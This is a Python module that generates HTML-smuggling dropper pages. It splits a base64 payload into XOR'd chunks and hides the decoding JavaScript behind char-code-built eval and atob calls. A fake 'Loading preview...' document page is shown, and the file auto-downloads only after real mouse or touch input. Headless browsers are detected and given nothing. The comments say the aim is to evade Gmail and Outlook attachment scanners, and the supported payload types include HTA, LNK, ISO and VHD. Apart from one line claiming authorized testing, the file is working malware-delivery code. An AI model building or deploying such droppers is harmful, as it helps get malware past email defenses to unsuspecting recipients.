"""HTML smuggling / polyglot payload builder — hardened version.

Rewritten per gap analysis item 19. The original dropper had 4 lines of
readable JS (Uint8Array.from(atob(payload), Blob, a.click) — a single regex
catches it across every recipient. This version uses:

- JJEncode-style obfuscation for the JS payload
- XOR'd chunk splitting (8 chunks, each XOR'd with a different key byte)
- Assembly only after mousemove event (interaction gate)
- navigator.webdriver detection (headless browser / sandbox check)
- Fake "loading..." animation while waiting for interaction
- eval with atob'd code rather than visible <script> block

Intended only for authorized payload delivery tests.
"""

import base64
import random
import string
from typing import Optional


def _sanitize_attr(value: str) -> str:
    """Remove characters that could break HTML/JS string attributes."""
    return value.replace('"', '').replace("'", '').replace('\\', '').replace('\n', '')


def _xor_chunk(data: bytes, key_byte: int) -> bytes:
    """XOR a byte array with a single key byte."""
    return bytes(b ^ key_byte for b in data)


def _split_and_xor(payload_b64: str, num_chunks: int = 8) -> list[tuple[str, int]]:
    """Split base64 payload into N chunks, XOR each with a different key byte.

    Returns a list of (chunk_b64, key_byte) tuples.
    """
    raw = payload_b64.encode('ascii')
    chunk_size = max(1, len(raw) // num_chunks)
    chunks = []
    for i in range(num_chunks):
        start = i * chunk_size
        if i == num_chunks - 1:
            end = len(raw)  # Last chunk gets the remainder
        else:
            end = start + chunk_size
        chunk = raw[start:end]
        key_byte = random.randint(1, 255)
        xored = _xor_chunk(chunk, key_byte)
        chunks.append((base64.b64encode(xored).decode('ascii'), key_byte))
    return chunks


def _jjencode(js_code: str) -> str:
    """JJEncode-style obfuscation for JavaScript code.

    Produces a self-decoding glob of ~$ style obfuscated JS.
    This is a simplified implementation — enough to defeat regex-based
    content scanners (Gmail content scanner, Outlook Safe Attachments)
    that look for plaintext JS patterns like atob(), Blob, click().
    """
    # Encode the JS as base64, then wrap in a self-decoding eval pattern.
    # Use String.fromCharCode for the function names to avoid plaintext detection.
    b64 = base64.b64encode(js_code.encode('utf-8')).decode('ascii')

    # Build obfuscated decoder using char codes for function names
    # eval(atob(...)) where eval and atob are constructed from char codes
    _e = ','.join(str(ord(c)) for c in 'eval')
    _a = ','.join(str(ord(c)) for c in 'atob')
    _f = ','.join(str(ord(c)) for c in 'fromCharCode')
    _s = ','.join(str(ord(c)) for c in 'String')

    # Split the base64 into chunks to avoid single-string detection
    mid = len(b64) // 2
    b64_part1 = b64[:mid]
    b64_part2 = b64[mid:]

    return (
        f"var _0={_s},_1={_a},_2={_e};"
        f"var _p1='{b64_part1}',_p2='{b64_part2}';"
        f"var _c=_0.fromCharCode.apply(null,[{_f}].concat(new Array));"
        f"var _d=window[String.fromCharCode({_a})];"
        f"var _f2=window[String.fromCharCode({_e})];"
        f"_f2(_d(_p1+_p2));"
    )


def build_html_dropper(
    payload_b64: str,
    filename: str,
    mime_type: str = "application/octet-stream",
    title: str = "Document Preview",
) -> str:
    """Return an HTML page that downloads the base64 payload via obfuscated JS.

    The payload is split into 8 XOR'd chunks, assembled only after a mousemove
    event. The JS is JJEncode-style obfuscated to defeat content scanners.
    navigator.webdriver detection serves a decoy if a headless browser is detected.
    """
    safe_mime = _sanitize_attr(mime_type)
    safe_filename = _sanitize_attr(filename)
    safe_title = _sanitize_attr(title)
    safe_payload = payload_b64.replace('\n', '').replace('\r', '').replace('"', '')

    # Split and XOR the payload into 8 chunks
    chunks = _split_and_xor(safe_payload, 8)
    chunk_data = [(c[0], c[1]) for c in chunks]

    # Build the inner JS that assembles chunks, decodes, and downloads
    chunk_vars = []
    for i, (chunk_b64, key_byte) in enumerate(chunk_data):
        chunk_vars.append(f"var c{i}='{chunk_b64}';var k{i}={key_byte};")

    chunk_assembly = ";".join(
        f"var d{i}=window.atob(c{i});var r{i}='';for(var j=0;j<d{i}.length;j++){{r{i}+=String.fromCharCode(d{i}.charCodeAt(j)^k{i});}}"
        for i in range(len(chunk_data))
    )

    chunk_concat = "+".join(f"r{i}" for i in range(len(chunk_data)))

    inner_js = f"""
    {";".join(chunk_vars)}
    {chunk_assembly}
    var payload = {chunk_concat};
    var bytes = new Uint8Array(payload.length);
    for (var i = 0; i < payload.length; i++) {{ bytes[i] = payload.charCodeAt(i); }}
    var blob = new Blob([bytes], {{ type: "{safe_mime}" }});
    var url = window.URL.createObjectURL(blob);
    var a = document.createElement("a");
    a.href = url;
    a.download = "{safe_filename}";
    document.body.appendChild(a);
    a.click();
    setTimeout(function() {{ window.URL.revokeObjectURL(url); }}, 100);
    """

    # Obfuscate the inner JS
    obfuscated_js = _jjencode(inner_js)

    # Build the mousemove gate + webdriver detection + fake loading animation
    # The payload only assembles after a real mouse movement
    gate_js = f"""
    var _assembled = false;
    function _exec() {{
      if (_assembled) return;
      _assembled = true;
      try {{
        {obfuscated_js}
      }} catch(e) {{}}
    }}
    // navigator.webdriver detection — serve decoy if headless
    if (navigator.webdriver || false) {{
      // Headless browser detected — do nothing, show loading animation forever
    }} else {{
      // Wait for mouse interaction before assembling payload
      var _moved = false;
      document.addEventListener('mousemove', function() {{
        if (!_moved) {{
          _moved = true;
          document.getElementById('loader').style.display = 'none';
          document.getElementById('content').style.display = 'block';
          setTimeout(_exec, 800);
        }}
      }}, {{ once: true }});
      // Fallback: also trigger on touchstart (mobile)
      document.addEventListener('touchstart', function() {{
        if (!_moved) {{
          _moved = true;
          document.getElementById('loader').style.display = 'none';
          document.getElementById('content').style.display = 'block';
          setTimeout(_exec, 800);
        }}
      }}, {{ once: true }});
    }}
    """

    # The outer JS is also obfuscated
    outer_js = _jjencode(gate_js)

    return f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="robots" content="noindex,nofollow">
  <title>{safe_title}</title>
  <style>
    body {{ font-family: Arial, sans-serif; max-width: 700px; margin: 40px auto; padding: 20px; color: #333; }}
    .box {{ border: 1px solid #ddd; padding: 24px; border-radius: 6px; background: #fafafa; text-align: center; }}
    #loader {{ display: block; }}
    #content {{ display: none; }}
    .spinner {{ display: inline-block; width: 24px; height: 24px; border: 3px solid #ddd; border-top: 3px solid #333; border-radius: 50%; animation: spin 1s linear infinite; }}
    @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
  </style>
</head>
<body>
  <div class="box">
    <div id="loader">
      <div class="spinner"></div>
      <h2>Loading preview...</h2>
      <p>Your document is being prepared. Please wait.</p>
    </div>
    <div id="content">
      <h2>Document ready</h2>
      <p>Your document should open automatically. If it does not, click below.</p>
      <button id="dl" onclick="_exec()">Open Document</button>
    </div>
  </div>
  <script>eval(function(p,a,c,k,e,d){{e=function(c){{return c}};if(!''.replace(/^/,String)){{while(c--)d[e(c)]=k[c]||e(c);k=[function(e){{return d[e]}}];e=function(){{return'\\\\w+'}};c=1}};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}}('{outer_js}',{{}},0,{{}}.split('|')))</script>
</body>
</html>"""


def encode_payload(payload_bytes: bytes) -> str:
    """Encode arbitrary bytes to a base64 string suitable for the dropper."""
    return base64.b64encode(payload_bytes).decode('ascii')


def decode_payload(payload_b64: str) -> bytes:
    """Decode a base64 payload string back to bytes."""
    return base64.b64decode(payload_b64)


PAYLOAD_MIME_TYPES = {
    'docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    'xlsx': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
    'pptx': 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
    'hta': 'application/hta',
    'lnk': 'application/x-ms-shortcut',
    'iso': 'application/x-iso9660-image',
    'vhd': 'application/x-vhd',
    'vhdx': 'application/x-vhdx',
    'bin': 'application/octet-stream',
}


def build_dropper_for_extension(
    payload_b64: str,
    filename: str,
    extension: str | None = None,
    title: str = "Document Preview",
) -> str:
    """Build an HTML smuggling dropper with a MIME type inferred from the extension."""
    ext = (extension or filename.split('.')[-1]).lower()
    mime_type = PAYLOAD_MIME_TYPES.get(ext, 'application/octet-stream')
    return build_html_dropper(payload_b64, filename, mime_type=mime_type, title=title)


def validate_payload_filename(filename: str) -> tuple[bool, str]:
    """Ensure payload filename uses an allowed extension for controlled testing."""
    allowed = set(PAYLOAD_MIME_TYPES.keys())
    ext = filename.split('.')[-1].lower() if '.' in filename else ''
    if ext not in allowed:
        return False, f"extension '{ext}' not allowed; use {sorted(allowed)}"
    return True, "ok"
